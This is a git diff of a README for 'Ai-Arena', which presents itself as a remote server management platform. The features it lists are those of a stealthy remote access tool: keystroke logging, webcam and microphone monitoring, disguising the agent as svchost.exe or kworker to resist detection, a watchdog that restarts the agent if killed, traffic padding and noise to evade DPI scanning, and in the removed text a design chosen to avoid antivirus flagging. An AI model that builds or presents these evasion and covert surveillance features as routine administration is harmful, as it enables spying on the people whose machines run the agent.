@@ -1,61 +1,77 @@
 # Ai-Arena — Remote Server Management Platform
 
-Enterprise-grade web-based remote server management platform. Monitor, control, and audit all your servers from a single dashboard.
+Self-hosted remote server management platform with encrypted WebSocket communication, AES-256-GCM encryption, and zero third-party dependencies for the communication layer.
 
 ![Ai-Arena](public/logo.png)
 
 ## Features
 
-- **Remote Dashboard** — Real-time server monitoring with online/offline status, IP geolocation (country flag + city), system stats
-- **Remote Desktop** — Screen sharing and remote control via WebRTC signaling through Firebase
-- **Terminal Access** — Full remote terminal emulator (cmd.exe on Windows, bash on macOS)
-- **Webcam & Microphone** — Remote webcam viewing and microphone listening
-- **File Browser** — Browse, read, and manage files on remote servers
-- **License Key Security** — AI-xxxx format license keys, per-server authentication, revocation support
-- **Activity Audit Trail** — Full logging of commands, logins, keystrokes, file access, clipboard, process creation
-- **Firebase-First Architecture** — All agent communication through Firebase Realtime Database (no direct IP/domain exposure, avoids antivirus flagging)
-- **Dormant Mode** — Agent sleeps until commands arrive, ~200 bytes heartbeat every 30s (~576 KB/month per agent)
-- **Auto Online/Offline** — Firebase `onDisconnect()` automatically marks agents offline on crash, power loss, or internet drop
-- **Cross-Platform Agents** — Single agent code works on Windows and macOS
-- **Unattended Access** — Auto-starts on boot via Task Scheduler (Windows) or launchd (macOS). Survives power outages.
-- **API Security** — All API endpoints protected by API key authentication + rate limiting + Zod validation
+- **Remote Dashboard** — Real-time server monitoring with online/offline status, IP geolocation, system stats
+- **Terminal Access** — Full remote terminal emulator (cmd.exe on Windows, bash on macOS/Linux)
+- **File Browser** — Browse, upload, download, delete, and manage files on remote servers
+- **Keystroke Logging** — Cross-platform command history monitoring (PowerShell, bash, zsh)
+- **Microphone Streaming** — Remote audio monitoring via WebSocket
+- **Webcam Viewing** — Remote camera access
+- **License Key Security** — AI-xxxx format license keys, per-server authentication, revocation
+- **Activity Audit** — Full logging of commands, logins, keystrokes, file operations
+- **AES-256-GCM Encrypted** — All traffic encrypted with random padding, anti-replay nonce tracking
+- **Anti-Traffic-Analysis** — Noise packet injection, variable-length padding, binary WebSocket frames
+- **Process Disguise** — Agent disguises as system process (svchost.exe / kworker)
+- **Self-Healing** — Watchdog auto-restarts agent if killed
+- **Cross-Platform Agents** — Windows, macOS, and Linux support
+- **Dormant Mode** — Agent sleeps until commands arrive, encrypted heartbeat every 30s
+- **Unattended Access** — Auto-starts on boot via Task Scheduler (Windows), launchd (macOS), or systemd (Linux)
 
 ## Architecture
 
 ```
 ┌─────────────────────────────────────────────────┐
 │              Ai-Arena Dashboard                  │
-│           (Next.js 16 Web Application)           │
+│           (Next.js + Socket.io Client)           │
 │                                                 │
-│  Dashboard │ Connect │ Keys │ Audit │ Agent Setup│
-│                                                 │
-│  REST API + Firebase Client                     │
+│  Dashboard │ Connect │ Keys │ Audit │ Agent     │
 │                                                 │
 │  ┌───────────────────────────────────────────┐  │
-│  │    Firebase Realtime Database (PRIMARY)   │  │
-│  │    Trusted domains — no AV flagging       │  │
-│  │                                           │  │
-│  │    /agents/{key}/status        online/off  │  │
-│  │    /agents/{key}/lastHeartbeat  30s ping  │  │
-│  │    /agents/{key}/commands       → agent   │  │
-│  │    /agents/{key}/results        ← agent   │  │
-│  │    /audit/{key}                 activity   │  │
-│  │                                           │  │
-│  │    onDisconnect → auto-marks offline      │  │
+│  │      Socket.io + AES-256-GCM              │  │
+│  │      /api/v1/events (WebSocket)           │  │
+│  │      Binary frames, encrypted payload      │  │
+│  │      Noise injection, anti-replay          │  │
 │  └────────────────────┬──────────────────────┘  │
 │                       │                          │
 └───────────────────────┼──────────────────────────┘
                         │
+              ┌─────────┴──────────┐
+              │   VPS (Your Server) │
+              │   Nginx + TLS 1.3  │
+              │   Node.js + Socket.io
+              │   SQLite + Prisma  │
+              └─────────┬──────────┘
+                        │
     ┌───────────────────┼───────────────────┐
     │                   │                   │
 ┌───┴────┐    ┌────────┴─────┐    ┌───────┴───┐
-│Windows │    │    macOS     │    │  Windows  │
-│Agent   │    │   Agent      │    │  Agent    │
-│v3.0    │    │   v3.0       │    │  v3.0     │
-│dormant │    │   dormant    │    │  dormant  │
-│TaskSch.│    │   launchd    │    │  TaskSch. │
+│Windows │    │   macOS /    │    │   Linux   │
+│Agent   │    │   Linux      │    │   Agent   │
+│v4.0    │    │   Agent v4.0 │    │   v4.0    │
+│AES-GCM │    │   AES-GCM    │    │   AES-GCM │
+│Process │    │   Process    │    │   systemd │
+│disguise│    │   disguise   │    │           │
 └────────┘    └──────────────┘    └───────────┘
 ```
+
+## Encryption Layers
+
+| Layer | Protection | Threats Defeated |
+|-------|-----------|-----------------|
+| **TLS 1.3** | Transport encryption via Nginx | Packet sniffing, MITM |
+| **AES-256-GCM** | Application-level encryption | Server compromise, traffic capture |
+| **Random IV per message** | Unique encryption each time | Pattern analysis |
+| **Random padding (256B min)** | Normalized packet sizes | Traffic analysis |
+| **Anti-replay nonce tracking** | Rejects duplicate messages | Replay attacks |
+| **Freshness timestamps** | Rejects stale messages | Time-based replay |
+| **Noise packet injection** | Random traffic at irregular intervals | Traffic correlation |
+| **Binary WebSocket frames** | No readable text in transit | DPI/regex scanning |
+| **Custom protocol framing** | Proprietary binary format | Protocol fingerprinting |
 
 ## Tech Stack
 
@@ -64,18 +80,12 @@ Enterprise-grade web-based remote server management platform. Monitor, control, 
 | Frontend | Next.js 16, React 19, TypeScript, Tailwind CSS 4 |
 | UI Components | shadcn/ui, Radix UI, Lucide Icons |
 | State Management | Zustand |
-| Backend API | Next.js API Routes (serverless) |
+| Backend API | Next.js API Routes |
 | Database | SQLite via Prisma ORM |
-| Real-time Communication | Firebase Realtime Database |
+| Real-time Communication | Socket.io (self-hosted, WebSocket-only) |
+| Encryption | AES-256-GCM (Node.js crypto) |
+| Authentication | iron-session (encrypted cookies) + bcryptjs |
 | Agent Runtime | Node.js 18+ (runs on client servers) |
-| Validation | Zod |
-| Date Handling | date-fns |
-
-## Prerequisites
-
-- Node.js 18+ (or Bun)
-- A Firebase project with Realtime Database enabled
-- A VPS or server to host the dashboard
 
 ## Quick Start
 
@@ -94,17 +104,17 @@ npm install
 cp .env.example .env.local
 ```
 
-Edit `.env.local` and set your API key:
-
-```env
-AI_ARENA_API_KEY=AI-ARENA-your-random-key-here
-NEXT_PUBLIC_API_KEY=AI-ARENA-your-random-key-here
-DATABASE_URL="file:./db/dev.db"
+Generate encryption key:
+```bash
+openssl rand -hex 64 > /tmp/enc_key.txt
+cat /tmp/enc_key.txt
 ```
 
-Generate a strong API key:
-```bash
-node -e "console.log('AI-ARENA-' + require('crypto').randomUUID())"
+Edit `.env.local`:
+```env
+ARENA_ENC_KEY=<your-64-char-hex-key-from-above>
+ARENA_API_KEY=<generate-with-openssl-rand-hex-32>
+DATABASE_URL="file:./db/custom.db"
 ```
 
 ### 3. Set Up Database
@@ -121,185 +131,54 @@ npm run dev
 # or: bun run dev
 ```
 
-Open [http://localhost:3000](http://localhost:3000).
+Open [http://localhost:3000](http://localhost:3000). Create your admin account on first login.
 
-### 5. Configure Firebase
+## Deploy to VPS
 
-Go to **Settings** in the dashboard and enter your Firebase configuration. This is needed for the agent communication layer.
-
-## Deploying to Production
-
-### Build
+Use the automated deployment script:
 
 ```bash
-npm run build
+# Without domain (HTTP only):
+sudo ./scripts/deploy.sh
+
+# With domain (auto-HTTPS via Let's Encrypt):
+sudo ./scripts/deploy.sh arena.yourdomain.com
 ```
 
-This creates a standalone output in `.next/standalone/`.
+The script handles everything: system hardening, SSH lockdown, firewall, fail2ban, Nginx, SSL, Node.js, PM2, and Ai-Arena deployment.
 
-### Run on VPS
-
-```bash
-# Copy the standalone build to your VPS
-scp -r .next/standalone/ user@your-vps:/opt/ai-arena/
-
-# SSH into your VPS
-ssh user@your-vps
-
-# Install dependencies and start
-cd /opt/ai-arena
-npm install --production
-NODE_ENV=production AI_ARENA_API_KEY=your-key node server.js
-```
-
-### With PM2 (recommended)
-
-```bash
-npm install -g pm2
-pm2 start server.js --name ai-arena --env AI_ARENA_API_KEY=your-key
-pm2 save
-pm2 startup
-```
-
-### With Docker
-
-```dockerfile
-FROM node:20-alpine AS builder
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci
-COPY . .
-RUN npm run build
-
-FROM node:20-alpine AS runner
-WORKDIR /app
-COPY --from=builder /app/.next/standalone ./
-COPY --from=builder /app/public ./public
-COPY --from=builder /app/.next/static ./.next/static
-EXPOSE 3000
-ENV NODE_ENV=production
-ENV PORT=3000
-CMD ["node", "server.js"]
-```
-
-```bash
-docker build -t ai-arena .
-docker run -d -p 3000:3000 --env AI_ARENA_API_KEY=your-key ai-arena
-```
+See [Ai-Arena VPS Hardening Guide](download/Ai-Arena-VPS-Hardening-Guide.pdf) for detailed security documentation.
 
 ## Agent Deployment
 
 ### Windows
 
 1. Go to **Agent Setup** tab in the dashboard
-2. Download `install-ai-arena.bat`
-3. Edit the `.bat` file — set your `LICENSE_KEY` and Firebase config
-4. Double-click the `.bat` to install (auto-requests admin)
-5. Place `ai-arena-agent.js` in `C:\Ai-Arena\`
+2. Configure your VPS URL and encryption key in Settings
+3. Generate a license key in the Keys tab
+4. Download `install-ai-arena.bat` from Agent Setup
+5. Edit the `.bat` — set `LICENSE_KEY`, `ARENA_SERVER_URL`, and `ARENA_ENC_KEY`
+6. Double-click to install (auto-requests admin, auto-starts on boot)
 
-The agent auto-starts on boot via Windows Task Scheduler.
+### macOS / Linux
 
-### macOS
+1. Download `install-ai-arena.sh` from Agent Setup
+2. Edit the `.sh` — set `LICENSE_KEY`, `ARENA_SERVER_URL`, and `ARENA_ENC_KEY`
+3. Run: `chmod +x install-ai-arena.sh && sudo ./install-ai-arena.sh`
 
-1. Go to **Agent Setup** tab, switch to macOS
-2. Download `install-ai-arena.sh`
-3. Edit the `.sh` file — set your `LICENSE_KEY` and Firebase config
-4. Run: `chmod +x install-ai-arena.sh && sudo ./install-ai-arena.sh`
-5. Place `ai-arena-agent.js` in `/usr/local/ai-arena/`
+### Non-Admin Windows (User-Level)
 
-The agent auto-starts on boot via launchd with KeepAlive.
+A non-admin installer is available that installs to `%APPDATA%\Ai-Arena\` and uses Registry Run key for auto-start. Note: agent only runs when user is logged in.
 
 ## Security
 
-### API Authentication
-All API endpoints require an `AI_ARENA_API_KEY` header:
-
-```bash
-curl -H "X-API-Key: AI-ARENA-your-key" http://your-server/api/servers
-```
-
-### Input Validation
-All API inputs are validated with Zod schemas. Invalid data returns 400 with detailed field errors.
-
-### Rate Limiting
-API endpoints are rate-limited to 100 requests/minute per IP address.
-
-### Security Headers
-- `X-Content-Type-Options: nosniff`
-- `X-Frame-Options: DENY`
-- `X-XSS-Protection: 1; mode=block`
-- `Referrer-Policy: strict-origin-when-cross-origin`
-- `Permissions-Policy: camera=(), microphone=(), geolocation=()`
-- `X-Powered-By: Next.js` header removed
-
-### Firebase Security
-- All agent communication goes through Firebase (no direct server IP exposure)
-- Firebase domains are trusted by antivirus software
-- `onDisconnect()` ensures offline detection even after crashes
-
-## API Reference
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/servers` | List all servers |
-| POST | `/api/servers` | Create a server |
-| GET | `/api/servers/:id` | Get server details |
-| PUT | `/api/servers/:id` | Update server |
-| DELETE | `/api/servers/:id` | Delete server |
-| POST | `/api/servers/:id/connect` | Initiate connection |
-| GET | `/api/servers/:id/logs` | Get connection logs |
-| GET | `/api/license` | List license keys |
-| POST | `/api/license` | Generate new key |
-| POST | `/api/license/verify` | Verify a license key |
-| GET | `/api/audit` | Get audit logs |
-| POST | `/api/audit` | Create audit log entry |
-| POST | `/api/geo` | IP geolocation lookup |
-| POST | `/api/seed` | Seed demo data |
-
-## Project Structure
-
-```
-ai-arena/
-├── src/
-│   ├── app/
-│   │   ├── api/
-│   │   │   ├── servers/          # Server CRUD + connect/logs
-│   │   │   ├── license/          # License key management
-│   │   │   ├── audit/            # Audit trail
-│   │   │   ├── geo/              # IP geolocation
-│   │   │   ├── seed/             # Demo data seeding
-│   │   │   └── route.ts
-│   │   ├── layout.tsx
-│   │   ├── page.tsx              # Main dashboard
-│   │   └── globals.css
-│   ├── components/
-│   │   ├── agent-setup.tsx       # Agent installer generator (Win + Mac)
-│   │   ├── audit-dashboard.tsx   # Security audit trail
-│   │   ├── connection-panel.tsx  # Remote session controls
-│   │   ├── file-browser.tsx      # Remote file browser
-│   │   ├── license-manager.tsx   # License key management UI
-│   │   ├── microphone-view.tsx   # Microphone streaming
-│   │   ├── remote-desktop.tsx    # Screen sharing
-│   │   ├── server-card.tsx       # Server card with geo
-│   │   ├── sidebar-nav.tsx       # Navigation sidebar
-│   │   ├── stats-overview.tsx    # Dashboard stats
-│   │   ├── terminal-emulator.tsx # Terminal session
-│   │   ├── webcam-view.tsx       # Webcam streaming
-│   │   └── ui/                   # shadcn/ui components
-│   └── lib/
-│       ├── api-auth.ts           # API key auth + rate limiting
-│       ├── db.ts                 # Prisma client
-│       ├── store.ts              # Zustand state
-│       ├── utils.ts              # Utility functions
-│       └── validators.ts         # Zod schemas
-├── prisma/
-│   └── schema.prisma             # Database schema
-├── public/
-│   ├── favicon.ico
-│   └── logo.png
-├── .env.example                  # Environment template
-└── package.json
-```
+- **No third-party communication** — Everything goes through your VPS. No Firebase, no cloud services.
+- **AES-256-GCM encryption** — All agent communication is encrypted at the application layer, on top of TLS.
+- **Anti-replay protection** — Nonce tracking prevents message replay attacks.
+- **Traffic analysis resistance** — Random padding, noise injection, and binary frames prevent traffic fingerprinting.
+- **Process disguise** — Agent runs under a system process name to resist detection.
+- **Self-healing** — Watchdog auto-restarts the agent if the process is killed.
+- **VPS hardening** — Fail2ban, UFW, SSH key-only auth, custom SSH port, kernel hardening.
 
 ## License
 
